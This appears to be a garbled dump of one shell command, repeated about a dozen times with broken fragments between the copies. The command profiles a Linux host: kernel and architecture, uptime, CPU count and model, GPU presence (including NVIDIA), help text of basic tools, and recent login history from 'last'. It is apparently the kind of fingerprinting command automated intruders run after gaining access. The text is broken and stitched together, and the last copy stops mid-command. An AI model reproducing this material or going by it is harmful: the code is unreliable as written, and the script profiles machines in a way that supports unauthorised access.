"CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo 